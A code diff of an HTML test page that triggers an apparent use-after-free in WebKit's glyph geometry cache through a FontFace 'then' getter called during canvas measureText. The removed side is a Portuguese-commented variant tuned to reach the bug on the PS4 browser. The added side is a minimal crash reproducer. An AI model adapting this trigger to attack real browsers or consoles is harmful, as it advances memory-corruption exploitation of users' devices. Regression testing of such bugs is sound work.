@@ -2,104 +2,55 @@
 <html>
 <head><meta charset="utf-8"></head>
 <body>
-<pre id="log"></pre>
 <script>
-// UAF GlyphGeometryCache rehash — iteracoes escaladas para PS4
-//
-// Getter confirmado: local(Arial/Helvetica/Times/serif) + Cherokee → getter:true
-// Mas sem crash: 16 iteracoes (32 measureText) insuficientes para rehash no PS4
-//
-// GlyphGeometryCache e um HashMap. Rehash ocorre quando entries > capacity * loadFactor.
-// PS4 pode ter capacity inicial maior (128 ou 256 vs ~64 upstream).
-// Solucao: usar strings UNICAS por iteracao para maximizar entradas distintas no cache.
-//
-// Progressao testada:
-//   T1: 50 iteracoes  (100 measureText no getter) — entradas unicas: ~100
-//   T2: 100 iteracoes (200 measureText)           — entradas unicas: ~200
-//   T3: 200 iteracoes (400 measureText)           — entradas unicas: ~400
-//   T4: 500 iteracoes (1000 measureText)          — entradas unicas: ~1000
-//
-// Se T1 crasha: capacidade inicial do PS4 e < 100 entradas
-// Se T2 crasha: capacidade entre 100-200
-// etc.
 
-var out = document.getElementById('log');
-function log(s) { out.textContent += s + '\n'; }
-
-var ctx = null;
-var inGetter = false;
-var currentIter = 0;
-var getterFired = false;
+let ctx = null;
+let inGetter = false;
 
 Object.defineProperty(FontFace.prototype, 'then', {
     configurable: true,
-    get: function() {
-        if (inGetter || !ctx) return undefined;
+    get() {
+        if (inGetter || !ctx)
+            return undefined;
         inGetter = true;
-        getterFired = true;
-        // Strings UNICAS por iteracao — cada uma insere entrada DIFERENTE
-        // no GlyphGeometryCache, maximizando o crescimento do bucket array
-        for (var i = 0; i < currentIter; i++) {
-            // String com indice garante unicidade
-            try { ctx.measureText('q' + i + String.fromCharCode(65 + (i % 26)) + 'z'); } catch(e) {}
-            try { ctx.measureText(String.fromCharCode(48 + (i % 10)) + 'x' + i);         } catch(e) {}
+        for (let i = 0; i < 16; i++) {
+            try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch (e) { }
+            try { ctx.measureText('x'); } catch (e) { }
         }
         inGetter = false;
         return undefined;
     }
 });
 
-function attempt(n, font) {
-    getterFired = false;
-    for (var d = 0; d < 3; d++)
-        new FontFace('Dummy' + n + '_' + d + '_' + currentIter, 'local(' + font + ')');
+function attempt(n)
+{
+    for (let d = 0; d < 3; d++)
+        new FontFace('Dummy' + n + '_' + d, 'local(Helvetica)');
 
-    var family = 'VarFam' + n + '_' + currentIter;
-    var face = new FontFace(family, 'local(' + font + ')');
+    const family = 'VarFam' + n;
+    const face = new FontFace(family, 'local(Helvetica)');
     void face.loaded;
     document.fonts.add(face);
 
-    var canvas = document.createElement('canvas');
-    canvas.width = 10; canvas.height = 10;
+    const canvas = document.createElement('canvas');
+    canvas.width = 10;
+    canvas.height = 10;    
     ctx = canvas.getContext('2d');
-    ctx.font = '20px ' + font + ', ' + family;
+    ctx.font = '20px Helvetica, ' + family;
 
-    // Pre-calls com strings unicas para popular o cache antes do trigger
-    // Assim o cache esta mais proximo da capacidade quando o getter dispara
-    for (var i = 0; i < 50; i++)
-        ctx.measureText('pre' + i + 'x');
+    for (let i = 0; i < 50; i++)
+        ctx.measureText('x');
 
-    // Cherokee → nao coberto por primary → VarFam → getter dispara
-    ctx.measureText('\u13A0\u13A2\u13A4');
-    return getterFired;
+    // U+E005 is absent from Helvetica, so this walks the fallback list into the pending face.
+    ctx.measureText('?AB');
 }
 
-function runTest(label, iters, font) {
-    currentIter = iters;
-    log('--- ' + label + ' (' + (iters * 2) + ' measureText no getter) ---');
-    log('    [EXECUTANDO] <<<');
-    var fired = false;
-    try {
-        for (var n = 0; n < 3; n++) {
-            try { fired = attempt(n, font) || fired; } catch(e) {}
+window.onload = function () {
+    setTimeout(function () {
+        for (let n = 0; n < 3; n++) {
+            try { attempt(n); } catch (e) { }
         }
-    } catch(e) {}
-    log('    PASSOU  |  getter: ' + fired + '\n');
-}
-
-window.onload = function() {
-    setTimeout(function() {
-
-        // Usando Arial (confirmado que getter dispara)
-        runTest('T1: Arial + 50 iter (100 measureText)', 50, 'Arial');
-        runTest('T2: Arial + 100 iter (200 measureText)', 100, 'Arial');
-        runTest('T3: Arial + 200 iter (400 measureText)', 200, 'Arial');
-        runTest('T4: Arial + 500 iter (1000 measureText)', 500, 'Arial');
-
-        log('=== FIM ===');
-        log('Se todos passaram: GlyphGeometryCache do PS4 tem capacidade > 1000 entradas');
-        log('ou o mecanismo de rehash e diferente desta versao do WebKit.');
-
+        document.body.appendChild(document.createTextNode("PASS if no crash"));
     }, 0);
 };
 </script>
